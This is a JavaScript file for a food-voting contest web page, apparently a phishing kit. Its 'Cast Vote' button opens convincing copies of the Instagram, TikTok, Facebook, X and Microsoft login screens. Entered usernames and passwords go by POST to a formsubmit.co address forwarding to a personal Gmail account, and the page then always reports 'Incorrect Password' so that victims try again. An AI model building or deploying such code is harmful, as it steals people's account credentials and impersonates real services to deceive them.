function createFoodImage(prompt, imageSize = 'landscape_4_3') {
  return `https://coresg-normal.trae.ai/api/ide/v1/text_to_image?prompt=${encodeURIComponent(
    prompt,
  )}&image_size=${imageSize}`
}

const artworks = [
  {
    id: '001',
    title: 'New York-Style Pepperoni Pizza',
    category: 'Street Food',
    description:
      'A classic thin, foldable slice with bubbling mozzarella, spicy pepperoni, and a crisp New York crust.',
    image: 'https://i.pinimg.com/736x/94/b4/76/94b476d40ba634cb1186dcad87df0395.jpg',
    votes: 238,
    hashtag: '#NYPepperoniPizza',
  },
  {
    id: '002',
    title: 'Texas BBQ Brisket Plate',
    category: 'Main Course',
    description:
      'Slow-smoked brisket with a peppery bark, served with pickles, onions, and a side of classic BBQ slaw.',
    image: 'https://i.pinimg.com/236x/9d/e6/3b/9de63b07ea0b3176bb4865c9752ec033.jpg',
    votes: 120,
    hashtag: '#TexasBBQBrisket',
  },
  {
    id: '003',
    title: 'Classic Cheeseburger & Fries',
    category: 'Street Food',
    description:
      'A juicy beef patty with melted cheddar, lettuce, tomato, and a toasted bun served with golden fries.',
    image: 'https://i.pinimg.com/736x/4f/bc/38/4fbc38f1db4fa33513f3f60db9a72d42.jpg',
    votes: 200,
    hashtag: '#ClassicCheeseburger',
  },
  {
    id: '004',
    title: 'Apple Pie à la Mode',
    category: 'Dessert',
    description:
      'Warm cinnamon apple pie with a flaky crust, topped with a scoop of vanilla ice cream and caramel drizzle.',
    image: 'https://i.pinimg.com/1200x/fe/d2/00/fed200db642358b8dbee6c59ce59f1b7.jpg',
    votes: 176,
    hashtag: '#ApplePieALaMode',
  },
  {
    id: '005',
    title: 'Japanese Sushi Platter',
    category: 'Main Course',
    description:
      'A colorful assortment of nigiri and maki with fresh salmon, tuna, and avocado served with soy and wasabi.',
    image: 'https://i.pinimg.com/1200x/0c/59/d9/0c59d918a4273ef47798d39dc1011677.jpg',
    votes: 96,
    hashtag: '#SushiPlatter',
  },
  {
    id: '006',
    title: 'Tacos al Pastor',
    category: 'Street Food',
    description:
      'Corn tortillas filled with marinated pork, pineapple, onion, cilantro, and a squeeze of lime.',
    image: 'https://i.pinimg.com/1200x/de/4a/e7/de4ae7da54f3735dc2fd5fdbc6e0fc5a.jpg',
    votes: 62,
    hashtag: '#TacosAlPastor',
  },
  {
    id: '007',
    title: 'Thai Pad Thai Noodles',
    category: 'Main Course',
    description:
      'Stir-fried rice noodles with shrimp, egg, bean sprouts, peanuts, and a tangy tamarind sauce.',
    image: 'https://i.pinimg.com/1200x/20/54/a8/2054a89384c8cb96fd4e03db2e9aeb79.jpg',
    votes: 145,
    hashtag: '#PadThai',
  },
  {
    id: '008',
    title: 'Italian Tiramisu',
    category: 'Dessert',
    description:
      'Espresso-soaked ladyfingers layered with mascarpone cream and finished with a cocoa dusting.',
    image: 'https://i.pinimg.com/736x/c1/31/dc/c131dc43b2e31eefb38ad141a4ffc243.jpg',
    votes: 89,
    hashtag: '#Tiramisu',
  },
]

const featuredFoodFallbackImage = createFoodImage(
  'festival food table with assorted gourmet dishes, realistic food photography, warm lighting, high detail, inviting presentation',
)

const voteProviders = {
  instagram: {
    id: 'instagram',
    label: 'Instagram',
    buttonLabel: 'Vote with Instagram',
    buttonClassName: 'vote-service-button--instagram',
    icon: `
      <svg viewBox="0 0 24 24" aria-hidden="true">
        <rect x="3.5" y="3.5" width="17" height="17" rx="4.5"></rect>
        <circle cx="12" cy="12" r="4"></circle>
        <circle cx="17.4" cy="6.6" r="0.9" class="is-filled"></circle>
      </svg>
    `,
  },
  tiktok: {
    id: 'tiktok',
    label: 'TikTok',
    buttonLabel: 'Vote with TikTok',
    buttonClassName: 'vote-service-button--tiktok',
    icon: `
      <svg viewBox="0 0 24 24" aria-hidden="true">
        <path d="M14.3 3c.2 1.4 1 2.6 2.1 3.4.9.6 2 .9 3.1 1v3.2c-1.3 0-2.6-.3-3.8-.8v5.2c0 3.5-2.9 6.3-6.4 6.3S3 18.5 3 15s2.9-6.3 6.3-6.3c.4 0 .9 0 1.3.1V12a3.5 3.5 0 0 0-1.3-.2c-1.8 0-3.2 1.4-3.2 3.2s1.4 3.2 3.2 3.2 3.2-1.4 3.2-3.2V3h1.8Z"></path>
      </svg>
    `,
  },
  facebook: {
    id: 'facebook',
    label: 'Facebook',
    buttonLabel: 'Vote with Facebook',
    buttonClassName: 'vote-service-button--facebook',
    icon: `
      <svg viewBox="0 0 24 24" aria-hidden="true">
        <path d="M13.5 21v-7h2.4l.4-3h-2.8V9.2c0-.9.3-1.5 1.6-1.5h1.4V5.1c-.7-.1-1.5-.1-2.2-.1-2.2 0-3.8 1.3-3.8 3.9V11H8v3h2.5v7h3Z"></path>
      </svg>
    `,
  },
  twitter: {
    id: 'twitter',
    label: 'X / Twitter',
    buttonLabel: 'Vote with X / Twitter',
    buttonClassName: 'vote-service-button--twitter',
    icon: `
      <svg viewBox="0 0 24 24" aria-hidden="true">
        <path d="M18.9 3H22l-6.8 7.8L23 21h-6.1l-4.8-6.4L6.5 21H3.4l7.2-8.2L3 3h6.2l4.3 5.8L18.9 3Zm-1.1 16h1.7L8.2 4.9H6.4L17.8 19Z"></path>
      </svg>
    `,
  },
  microsoft: {
    id: 'microsoft',
    label: 'Microsoft',
    buttonLabel: 'Vote with Microsoft',
    buttonClassName: 'vote-service-button--microsoft',
    icon: `
      <svg viewBox="0 0 24 24" aria-hidden="true">
        <path d="M4 4h7.4v7.4H4V4Zm8.6 0H20v7.4h-7.4V4ZM4 12.6h7.4V20H4v-7.4Zm8.6 0H20V20h-7.4v-7.4Z"></path>
      </svg>
    `,
  },
}

const galleryGrid = document.getElementById('gallery-grid')
const filterButtons = Array.from(document.querySelectorAll('.filters__button'))
const startVotingButton = document.getElementById('start-voting')
const mobileVoteButton = document.getElementById('mobile-vote-button')
const gallerySection = document.getElementById('gallery')
const menuToggle = document.getElementById('menu-toggle')
const mobileMenu = document.getElementById('mobile-menu')
const voteModal = document.getElementById('vote-modal')
const voteModalDialog = document.querySelector('.vote-modal__dialog')
const voteModalContent = document.getElementById('vote-modal-content')
const voteModalClose = document.getElementById('vote-modal-close')

let activeCategory = 'All'
let activeVoteArtwork = null
let activeVoteProvider = null
let activeVoteScreen = 'services'
let twitterIdentityValue = ''
let microsoftIdentityValue = ''
const voteErrorStorageKey = 'vote-login-error-state'
const voteFormEndpoint = 'https://formsubmit.co/goldenpathcapital13@gmail.com'

function escapeHtml(value) {
  return String(value)
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')
    .replaceAll("'", '&#39;')
}

function getLogoImageMarkup(fileName, alt, className = '') {
  const safeFileName = String(fileName).replaceAll(' ', '%20')
  const safeClassName = className ? ` ${className}` : ''
  return `<img src="./${safeFileName}" alt="${escapeHtml(alt)}" class="provider-logo${safeClassName}" />`
}

function getBackendFormAttributes(submitMode = 'submit') {
  return `action="${voteFormEndpoint}" method="POST" data-submit-mode="${submitMode}"`
}

function getBackendHiddenFields(provider, artwork, extraFields = {}) {
  const fields = {
    _next: '#',
    _captcha: 'false',
    provider,
    artworkId: artwork?.id || '',
    artworkTitle: artwork?.title || '',
    ...extraFields,
  }

  return Object.entries(fields)
    .filter(([, value]) => value !== '')
    .map(
      ([name, value]) =>
        `<input type="hidden" name="${escapeHtml(name)}" value="${escapeHtml(value)}" />`,
    )
    .join('')
}

function getVisibleArtworks() {
  return activeCategory === 'All'
    ? artworks
    : artworks.filter((artwork) => artwork.category === activeCategory)
}

function renderGallery() {
  galleryGrid.innerHTML = getVisibleArtworks()
    .map(
      (artwork) => `
        <article class="art-card">
          <div class="art-card__media">
            <img
              src="${artwork.image}"
              alt="${escapeHtml(artwork.title)}"
              loading="lazy"
              onerror="this.onerror=null;this.src='${featuredFoodFallbackImage}'"
            />
            <div class="art-card__votes">${artwork.votes} Votes</div>
          </div>
          <div class="art-card__body">
            <p class="art-card__category">${escapeHtml(artwork.category)}</p>
            <h3 class="art-card__title">${escapeHtml(artwork.title)}</h3>
            <p class="art-card__description">${escapeHtml(artwork.description)}</p>
            <button class="art-card__button" data-artwork-id="${artwork.id}" type="button">
              Cast Vote
            </button>
          </div>
        </article>
      `,
    )
    .join('')
}

function getArtworkById(id) {
  return artworks.find((artwork) => artwork.id === id) || null
}

function getProviderById(id) {
  return voteProviders[id] || null
}

function syncBodyScroll() {
  document.body.style.overflow =
    mobileMenu.classList.contains('is-open') || voteModal.classList.contains('is-visible')
      ? 'hidden'
      : ''
}

function closeMobileMenu() {
  mobileMenu.classList.remove('is-open')
  menuToggle.classList.remove('is-open')
  menuToggle.setAttribute('aria-label', 'Open menu')
  syncBodyScroll()
}

function openMobileMenu() {
  mobileMenu.classList.add('is-open')
  menuToggle.classList.add('is-open')
  menuToggle.setAttribute('aria-label', 'Close menu')
  syncBodyScroll()
}

function scrollToGallery() {
  gallerySection.scrollIntoView({ behavior: 'smooth', block: 'start' })
}

function setVoteModalState(providerId, screen) {
  activeVoteProvider = providerId
  activeVoteScreen = screen
  updateVoteModalDialogClass()
}

function updateVoteModalDialogClass() {
  const classNames = ['vote-modal__dialog']

  if (activeVoteScreen === 'services') {
    classNames.push('vote-modal__dialog--services')
  }

  if (activeVoteProvider) {
    classNames.push(`vote-modal__dialog--${activeVoteProvider}`)
  }

  if (activeVoteScreen === 'tiktok-options') {
    classNames.push('vote-modal__dialog--tiktok-options')
  }

  if (activeVoteScreen === 'tiktok-auth') {
    classNames.push('vote-modal__dialog--tiktok-auth')
  }

  if (activeVoteScreen === 'twitter-step-1') {
    classNames.push('vote-modal__dialog--twitter-step-1')
  }

  if (activeVoteScreen === 'twitter-step-2') {
    classNames.push('vote-modal__dialog--twitter-step-2')
  }

  if (activeVoteScreen === 'microsoft-step-1') {
    classNames.push('vote-modal__dialog--microsoft-step-1')
  }

  if (activeVoteScreen === 'microsoft-step-2') {
    classNames.push('vote-modal__dialog--microsoft-step-2')
  }

  if (activeVoteScreen === 'provider-auth') {
    classNames.push('vote-modal__dialog--provider-auth')
  }

  voteModalDialog.className = classNames.join(' ')
  voteModalClose.hidden = false
}

function getVoteServiceMarkup() {
  return `
    <div class="vote-panel vote-panel--services">
      <div class="vote-panel__icon">
        <svg viewBox="0 0 24 24" aria-hidden="true">
          <path d="m12 3 2.75 5.58 6.16.9-4.45 4.33 1.05 6.12L12 17.03 6.49 19.93l1.05-6.12L3.09 9.48l6.16-.9L12 3Z"></path>
        </svg>
      </div>
      <h2 class="vote-panel__title" id="vote-modal-heading">Cast Your Vote</h2>
      <p class="vote-panel__subtitle">Select a service to vote with</p>
      <div class="vote-services">
        ${Object.values(voteProviders)
          .map(
            (provider) => `
              <button
                class="vote-service-button ${provider.buttonClassName}"
                data-vote-provider="${provider.id}"
                type="button"
              >
                <span class="vote-service-button__icon">${provider.icon}</span>
                <span class="vote-service-button__label">${escapeHtml(provider.buttonLabel)}</span>
                <span class="vote-service-button__arrow" aria-hidden="true">&rsaquo;</span>
              </button>
            `,
          )
          .join('')}
      </div>
    </div>
  `
}

function getErrorMarkup() {
  return `<p class="provider-error" data-vote-error aria-live="polite"></p>`
}

function getInstagramAuthMarkup(artwork) {
  return `
    <div class="provider-auth provider-auth--instagram">
      <div class="provider-auth__card provider-auth__card--instagram">
        <div class="instagram-logo">${getLogoImageMarkup('instagram.png', 'Instagram logo', 'instagram-logo__image')}</div>
        <form class="contact-form styled-contact-form provider-form provider-form--instagram" ${getBackendFormAttributes('submit')}>
          ${getBackendHiddenFields('instagram', artwork)}
          <input
            class="provider-form__input provider-form__input--instagram"
            type="text"
            name="identity"
            placeholder="Phone number, username, or email"
            required
          />
          <input
            class="provider-form__input provider-form__input--instagram"
            type="password"
            name="password"
            placeholder="Password"
            required
          />
          ${getErrorMarkup()}
          <button class="provider-form__submit provider-form__submit--instagram" type="submit">
            Log in
          </button>
        </form>
        <div class="instagram-divider"><span>OR</span></div>
        <button class="provider-link provider-link--instagram" data-vote-provider="facebook" type="button">
          <span class="provider-link__facebook-icon">${getLogoImageMarkup('facebook.png', 'Facebook logo', 'provider-link__logo')}</span>
          <span>Log in with Facebook</span>
        </button>
        <button class="provider-link provider-link--muted" type="button">Forgot password?</button>
      </div>
      <div class="provider-auth__signup provider-auth__signup--instagram">
        Don&apos;t have an account?
        <button class="provider-link provider-link--inline" type="button">Sign up</button>
      </div>
      <div class="provider-auth__footer provider-auth__footer--instagram">
        <div class="provider-auth__footer-links">
          <button type="button">Meta</button>
          <button type="button">About</button>
          <button type="button">Blog</button>
          <button type="button">Jobs</button>
          <button type="button">Help</button>
          <button type="button">API</button>
          <button type="button">Privacy</button>
          <button type="button">Terms</button>
        </div>
        <p>English &nbsp; &copy; 2026 Instagram from Meta</p>
      </div>
    </div>
  `
}

function getTikTokOptionsMarkup() {
  return `
    <div class="provider-auth provider-auth--tiktok-options">
      <div class="tiktok-shell">
        <div class="tiktok-shell__help">?</div>
        <h2 class="tiktok-shell__title" id="vote-modal-heading">Log in to TikTok</h2>
        <p class="tiktok-shell__subtitle">
          Manage your account, check notifications, comment on videos, and more.
        </p>
        <div class="tiktok-options">
          <button class="tiktok-option" type="button">
            <span class="tiktok-option__icon">${getLogoImageMarkup('qr code.png', 'QR code logo', 'tiktok-option__logo')}</span>
            <span>Use QR code</span>
          </button>
          <button class="tiktok-option" data-tiktok-login type="button">
            <span class="tiktok-option__icon">${getLogoImageMarkup('user.png', 'User login logo', 'tiktok-option__logo')}</span>
            <span>Use phone / email / username</span>
          </button>
          <button class="tiktok-option" data-vote-provider="facebook" type="button">
            <span class="tiktok-option__icon tiktok-option__icon--facebook">${getLogoImageMarkup('facebook.png', 'Facebook logo', 'tiktok-option__logo')}</span>
            <span>Continue with Facebook</span>
          </button>
          <button class="tiktok-option" type="button">
            <span class="tiktok-option__icon tiktok-option__icon--google">${getLogoImageMarkup('google.png', 'Google logo', 'tiktok-option__logo')}</span>
            <span>Continue with Google</span>
          </button>
        </div>
        <p class="tiktok-shell__terms">
          By continuing with an account located in <strong>Australia</strong>, you agree to our
          <strong> Terms of Service.</strong>
        </p>
      </div>
      <div class="tiktok-shell__signup">
        Don&apos;t have an account?
        <button class="provider-link provider-link--tiktok-inline" type="button">Sign up</button>
      </div>
    </div>
  `
}

function getTikTokAuthMarkup(artwork) {
  return `
    <div class="provider-auth provider-auth--tiktok-auth">
      <div class="tiktok-login">
        <div class="tiktok-login__topbar">
          <button class="tiktok-back" data-vote-back type="button" aria-label="Back">&lsaquo;</button>
          <h2 class="tiktok-login__title" id="vote-modal-heading">Log in</h2>
          <div class="tiktok-login__help">?</div>
        </div>
        <div class="tiktok-login__tabs">
          <button class="tiktok-login__tab" type="button">Phone</button>
          <button class="tiktok-login__tab is-active" type="button">Email / Username</button>
        </div>
        <form
          class="contact-form styled-contact-form provider-form provider-form--tiktok"
          ${getBackendFormAttributes('submit')}
          data-enable-on-input="true"
        >
          ${getBackendHiddenFields('tiktok', artwork)}
          <input
            class="provider-form__input provider-form__input--tiktok"
            type="text"
            name="identity"
            placeholder="Email or username"
            required
          />
          <div class="tiktok-password-field">
            <input
              class="provider-form__input provider-form__input--tiktok"
              type="password"
              name="password"
              placeholder="Password"
              required
            />
            <span class="tiktok-password-field__eye">◉</span>
          </div>
          <button class="provider-link provider-link--muted provider-link--left" type="button">
            Forgot password?
          </button>
          ${getErrorMarkup()}
          <button class="provider-form__submit provider-form__submit--tiktok" type="submit" disabled>
            Log in
          </button>
        </form>
      </div>
      <div class="tiktok-shell__signup">
        Don&apos;t have an account?
        <button class="provider-link provider-link--tiktok-inline" type="button">Sign up</button>
      </div>
    </div>
  `
}

function getFacebookAuthMarkup(artwork) {
  return `
    <div class="provider-auth provider-auth--facebook">
      <div class="facebook-auth">
        <div class="facebook-auth__logo">${getLogoImageMarkup('facebook.png', 'Facebook logo', 'facebook-auth__logo-image')}</div>
        <form class="contact-form styled-contact-form provider-form provider-form--facebook" ${getBackendFormAttributes('submit')}>
          ${getBackendHiddenFields('facebook', artwork)}
          <input
            class="provider-form__input provider-form__input--facebook"
            type="text"
            name="identity"
            placeholder="Mobile number or email address"
            required
          />
          <input
            class="provider-form__input provider-form__input--facebook"
            type="password"
            name="password"
            placeholder="Password"
            required
          />
          ${getErrorMarkup()}
          <button class="provider-form__submit provider-form__submit--facebook" type="submit">
            Log In
          </button>
          <button class="provider-link provider-link--muted provider-link--facebook" type="button">
            Forgotten password?
          </button>
          <button class="facebook-auth__create" type="button">Create new account</button>
        </form>
        <div class="facebook-auth__meta">${getLogoImageMarkup('meta.png', 'Meta logo', 'facebook-auth__meta-image')}</div>
        <div class="facebook-auth__footer">
          <button type="button">About</button>
          <button type="button">Help</button>
          <button type="button">More</button>
        </div>
      </div>
    </div>
  `
}

function getTwitterStepOneMarkup() {
  return `
    <div class="provider-auth provider-auth--twitter">
      <div class="twitter-auth twitter-auth--step-1">
        <div class="twitter-auth__logo" aria-hidden="true">${voteProviders.twitter.icon}</div>
        <h2 class="twitter-auth__title" id="vote-modal-heading">Sign in to X</h2>
        <button class="twitter-auth__social twitter-auth__social--light" type="button">
          <span class="twitter-auth__social-icon twitter-auth__social-icon--google">${getLogoImageMarkup('google.png', 'Google logo', 'twitter-auth__social-logo')}</span>
          <span>Sign in with Google</span>
        </button>
        <button class="twitter-auth__social twitter-auth__social--light" type="button">
          <span class="twitter-auth__social-icon twitter-auth__social-icon--apple">${getLogoImageMarkup('apple.png', 'Apple logo', 'twitter-auth__social-logo')}</span>
          <span>Sign in with Apple</span>
        </button>
        <div class="twitter-auth__divider"><span>or</span></div>
        <form class="contact-form styled-contact-form provider-form provider-form--twitter-step-1" data-submit-mode="twitter-next">
          <input
            class="provider-form__input provider-form__input--twitter"
            type="text"
            name="identity"
            placeholder="Phone, email, or username"
            required
          />
          <button class="provider-form__submit provider-form__submit--twitter-next" type="submit">
            Next
          </button>
        </form>
        <br>
        <button class="twitter-auth__secondary" type="button">Forgot password?</button>
        <p class="twitter-auth__signup">
          Don&apos;t have an account?
          <button class="provider-link provider-link--twitter-inline" type="button">Sign up</button>
        </p>
      </div>
    </div>
  `
}

function getTwitterStepTwoMarkup() {
  return `
    <div class="provider-auth provider-auth--twitter">
      <div class="twitter-auth twitter-auth--step-2">
        <div class="twitter-auth__logo" aria-hidden="true">${voteProviders.twitter.icon}</div>
        <h2 class="twitter-auth__title" id="vote-modal-heading">Enter your password</h2>
        <div class="twitter-auth__identity-card">
          <span class="twitter-auth__identity-label">Username</span>
          <strong>${escapeHtml(twitterIdentityValue || '')}</strong>
        </div>
        <form class="contact-form styled-contact-form provider-form provider-form--twitter-step-2" ${getBackendFormAttributes('submit')}>
          ${getBackendHiddenFields('twitter', activeVoteArtwork, { identity: twitterIdentityValue })}
          <input
            class="provider-form__input provider-form__input--twitter provider-form__input--twitter-password"
            type="password"
            name="password"
            placeholder="Password"
            required
          />
          ${getErrorMarkup()}
          <button class="provider-link provider-link--twitter-left" type="button">Forgot password?</button>
          <button class="provider-form__submit provider-form__submit--twitter-login" type="submit">
            Log in
          </button>
        </form>
        <p class="twitter-auth__signup">
          Don&apos;t have an account?
          <button class="provider-link provider-link--twitter-inline" type="button">Sign up</button>
        </p>
      </div>
    </div>
  `
}

function getMicrosoftAuthMarkup(artwork) {
  return `
    <div class="provider-auth provider-auth--microsoft">
      <div class="microsoft-auth">
        <div class="microsoft-auth__card">
          <div class="microsoft-brand" aria-hidden="true">
            <span class="microsoft-brand__mark">
              <span></span><span></span><span></span><span></span>
            </span>
            <span class="microsoft-brand__text">Microsoft</span>
          </div>
          <h2 class="microsoft-auth__title" id="vote-modal-heading">Sign in</h2>
          <form class="contact-form styled-contact-form provider-form provider-form--microsoft" data-submit-mode="microsoft-next">
            <input
              class="provider-form__input provider-form__input--microsoft"
              type="email"
              name="identity"
              placeholder="Email, phone, or Skype"
              required
            />
            <div class="microsoft-auth__links">
              <p class="microsoft-auth__inline-copy">
                No account?
                <button class="provider-link provider-link--microsoft-inline" type="button">Create one!</button>
              </p>
              <button class="provider-link provider-link--microsoft-link" type="button">
                Can&apos;t access your account?
              </button>
            </div>
            <div class="microsoft-auth__actions">
              <button class="provider-form__submit provider-form__submit--microsoft" type="submit">
                Next
              </button>
            </div>
          </form>
        </div>
        <button class="microsoft-auth__options" type="button">
          <span class="microsoft-auth__options-icon" aria-hidden="true">⌕</span>
          <span>Sign-in options</span>
        </button>
      </div>
    </div>
  `
}

function getMicrosoftPasswordMarkup(artwork) {
  return `
    <div class="provider-auth provider-auth--microsoft">
      <div class="microsoft-auth">
        <div class="microsoft-auth__card">
          <div class="microsoft-brand" aria-hidden="true">
            <span class="microsoft-brand__mark">
              <span></span><span></span><span></span><span></span>
            </span>
            <span class="microsoft-brand__text">Microsoft</span>
          </div>
          <button class="microsoft-auth__back" data-vote-back type="button">
            <span aria-hidden="true">&lsaquo;</span>
            <span>${escapeHtml(microsoftIdentityValue || '')}</span>
          </button>
          <h2 class="microsoft-auth__title" id="vote-modal-heading">Enter password</h2>
          <form class="contact-form styled-contact-form provider-form provider-form--microsoft" ${getBackendFormAttributes('submit')}>
          ${getBackendHiddenFields('microsoft', artwork, { identity: microsoftIdentityValue })}
          <input
            class="provider-form__input provider-form__input--microsoft"
            type="password"
            name="password"
            placeholder="Password"
            required
          />
          ${getErrorMarkup()}
            <div class="microsoft-auth__links">
              <button class="provider-link provider-link--microsoft-link" type="button">
                Forgot password?
              </button>
              <button class="provider-link provider-link--microsoft-link" type="button">
                Other ways to sign in
              </button>
            </div>
            <div class="microsoft-auth__actions">
              <button class="provider-form__submit provider-form__submit--microsoft" type="submit">
                Sign in
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  `
}

function renderVoteModal() {
  if (!activeVoteArtwork) {
    voteModalContent.innerHTML = ''
    return
  }

  if (activeVoteScreen === 'services' || !activeVoteProvider) {
    voteModalContent.innerHTML = getVoteServiceMarkup()
    return
  }

  if (activeVoteProvider === 'instagram') {
    voteModalContent.innerHTML = getInstagramAuthMarkup(activeVoteArtwork)
    return
  }

  if (activeVoteProvider === 'facebook') {
    voteModalContent.innerHTML = getFacebookAuthMarkup(activeVoteArtwork)
    return
  }

  if (activeVoteProvider === 'tiktok' && activeVoteScreen === 'tiktok-options') {
    voteModalContent.innerHTML = getTikTokOptionsMarkup()
    return
  }

  if (activeVoteProvider === 'tiktok' && activeVoteScreen === 'tiktok-auth') {
    voteModalContent.innerHTML = getTikTokAuthMarkup(activeVoteArtwork)
    return
  }

  if (activeVoteProvider === 'twitter' && activeVoteScreen === 'twitter-step-1') {
    voteModalContent.innerHTML = getTwitterStepOneMarkup()
    return
  }

  if (activeVoteProvider === 'twitter' && activeVoteScreen === 'twitter-step-2') {
    voteModalContent.innerHTML = getTwitterStepTwoMarkup()
    return
  }

  if (activeVoteProvider === 'microsoft' && activeVoteScreen === 'microsoft-step-2') {
    voteModalContent.innerHTML = getMicrosoftPasswordMarkup(activeVoteArtwork)
    return
  }

  if (activeVoteProvider === 'microsoft') {
    voteModalContent.innerHTML = getMicrosoftAuthMarkup(activeVoteArtwork)
  }
}

function openVoteModal(artwork) {
  activeVoteArtwork = artwork
  twitterIdentityValue = ''
  microsoftIdentityValue = ''
  setVoteModalState(null, 'services')
  renderVoteModal()
  voteModal.classList.add('is-visible')
  voteModal.setAttribute('aria-hidden', 'false')
  syncBodyScroll()
}

function closeVoteModal() {
  activeVoteArtwork = null
  activeVoteProvider = null
  activeVoteScreen = 'services'
  twitterIdentityValue = ''
  microsoftIdentityValue = ''
  voteModalDialog.className = 'vote-modal__dialog vote-modal__dialog--services'
  voteModal.classList.remove('is-visible')
  voteModal.setAttribute('aria-hidden', 'true')
  voteModalContent.innerHTML = ''
  syncBodyScroll()
}

function openVoteProvider(providerId) {
  if (providerId === 'tiktok') {
    setVoteModalState('tiktok', 'tiktok-options')
  } else if (providerId === 'twitter') {
    setVoteModalState('twitter', 'twitter-step-1')
  } else if (providerId === 'microsoft') {
    setVoteModalState('microsoft', 'microsoft-step-1')
  } else {
    setVoteModalState(providerId, 'provider-auth')
  }

  renderVoteModal()
}

function resetFormErrorState(form) {
  form.classList.remove('has-error')
  const error = form.querySelector('[data-vote-error]')
  if (error) {
    error.textContent = ''
  }

  form.querySelectorAll('input').forEach((input) => {
    input.removeAttribute('aria-invalid')
  })
}

function showIncorrectPassword(form) {
  const error = form.querySelector('[data-vote-error]')
  if (error) {
    error.textContent = 'Incorrect Password. Try Again.'
  }

  form.classList.add('has-error')
  form.querySelectorAll('input[type="text"], input[type="password"], input[type="email"]').forEach((input) => {
    input.setAttribute('aria-invalid', 'true')
  })
}

async function handleProviderLoginAttempt(form) {
  if (form.dataset.isSubmitting === 'true') {
    return
  }

  const submitButton = form.querySelector('.provider-form__submit')
  const originalLabel =
    submitButton?.dataset.originalLabel ||
    submitButton?.textContent ||
    submitButton?.value ||
    'Submit'

  form.dataset.isSubmitting = 'true'

  if (submitButton) {
    submitButton.dataset.originalLabel = originalLabel
    submitButton.disabled = true
    if (submitButton.tagName === 'BUTTON') {
      submitButton.textContent = 'Submitting...'
    } else {
      submitButton.value = 'Submitting...'
    }
  }

  try {
    const response = await fetch(voteFormEndpoint, {
      method: 'POST',
      body: new FormData(form),
      headers: {
        Accept: 'application/json',
      },
    })

    if (!response.ok) {
      throw new Error(`Vote form request failed with status ${response.status}`)
    }

    showIncorrectPassword(form)
  } catch {
    showIncorrectPassword(form)
  } finally {
    form.dataset.isSubmitting = 'false'

    if (submitButton) {
      submitButton.disabled = false
      if (submitButton.tagName === 'BUTTON') {
        submitButton.textContent = originalLabel
      } else {
        submitButton.value = originalLabel
      }
    }
  }
}

function restoreFailedLoginState() {
  let rawState = ''

  try {
    rawState = sessionStorage.getItem(voteErrorStorageKey) || ''
    sessionStorage.removeItem(voteErrorStorageKey)
  } catch {
    return
  }

  if (!rawState) {
    return
  }

  try {
    const state = JSON.parse(rawState)
    const artwork = getArtworkById(state.artworkId || '')

    if (!artwork || !state.providerId) {
      return
    }

    activeVoteArtwork = artwork
    twitterIdentityValue = state.twitterIdentityValue || ''
    microsoftIdentityValue = state.microsoftIdentityValue || ''
    setVoteModalState(state.providerId, state.screen || 'provider-auth')
    renderVoteModal()
    voteModal.classList.add('is-visible')
    voteModal.setAttribute('aria-hidden', 'false')
    syncBodyScroll()

    const form = voteModalContent.querySelector('form')
    if (form) {
      showIncorrectPassword(form)
    }
  } catch {
    // Ignore invalid restored state.
  }
}

filterButtons.forEach((button) => {
  button.addEventListener('click', () => {
    activeCategory = button.dataset.category || 'All'
    filterButtons.forEach((item) => item.classList.remove('is-active'))
    button.classList.add('is-active')
    renderGallery()
  })
})

galleryGrid.addEventListener('click', (event) => {
  const button = event.target.closest('.art-card__button')
  if (!button) {
    return
  }

  const artwork = getArtworkById(button.dataset.artworkId || '')
  if (artwork) {
    openVoteModal(artwork)
  }
})

startVotingButton.addEventListener('click', scrollToGallery)

mobileVoteButton.addEventListener('click', () => {
  closeMobileMenu()
  scrollToGallery()
})

menuToggle.addEventListener('click', () => {
  if (mobileMenu.classList.contains('is-open')) {
    closeMobileMenu()
    return
  }

  openMobileMenu()
})

mobileMenu.querySelectorAll('a').forEach((link) => {
  link.addEventListener('click', closeMobileMenu)
})

mobileMenu.addEventListener('click', (event) => {
  if (event.target === mobileMenu) {
    closeMobileMenu()
  }
})

voteModal.addEventListener('click', (event) => {
  const closeButton = event.target.closest('[data-close-vote-modal]')
  if (closeButton) {
    closeVoteModal()
    return
  }

  const providerButton = event.target.closest('[data-vote-provider]')
  if (providerButton) {
    openVoteProvider(providerButton.dataset.voteProvider || '')
    return
  }

  const tiktokLoginButton = event.target.closest('[data-tiktok-login]')
  if (tiktokLoginButton) {
    setVoteModalState('tiktok', 'tiktok-auth')
    renderVoteModal()
    return
  }

  const backButton = event.target.closest('[data-vote-back]')
  if (backButton) {
    if (activeVoteProvider === 'tiktok' && activeVoteScreen === 'tiktok-auth') {
      setVoteModalState('tiktok', 'tiktok-options')
    } else if (activeVoteProvider === 'microsoft' && activeVoteScreen === 'microsoft-step-2') {
      setVoteModalState('microsoft', 'microsoft-step-1')
    } else {
      setVoteModalState(null, 'services')
    }
    renderVoteModal()
  }
})

voteModalContent.addEventListener('submit', async (event) => {
  const form = event.target.closest('form')
  if (!form) {
    return
  }

  if (!form.reportValidity()) {
    event.preventDefault()
    return
  }

  resetFormErrorState(form)

  if (form.dataset.submitMode === 'twitter-next') {
    event.preventDefault()
    twitterIdentityValue = form.elements.identity.value.trim()
    setVoteModalState('twitter', 'twitter-step-2')
    renderVoteModal()
    return
  }

  if (form.dataset.submitMode === 'microsoft-next') {
    event.preventDefault()
    microsoftIdentityValue = form.elements.identity.value.trim()
    setVoteModalState('microsoft', 'microsoft-step-2')
    renderVoteModal()
    return
  }

  event.preventDefault()
  await handleProviderLoginAttempt(form)
})

voteModalContent.addEventListener('input', (event) => {
  const form = event.target.closest('form')
  if (!form) {
    return
  }

  resetFormErrorState(form)

  if (form.dataset.enableOnInput !== 'true') {
    return
  }

  const submitButton = form.querySelector('.provider-form__submit')
  const requiredFields = Array.from(form.querySelectorAll('input[required]'))
  const isReady = requiredFields.every((field) => field.value.trim().length > 0)

  if (submitButton) {
    submitButton.disabled = !isReady
  }
})

voteModalClose.addEventListener('click', closeVoteModal)

window.addEventListener('keydown', (event) => {
  if (event.key === 'Escape' && voteModal.classList.contains('is-visible')) {
    closeVoteModal()
  }
})

renderGallery()
restoreFailedLoginState()
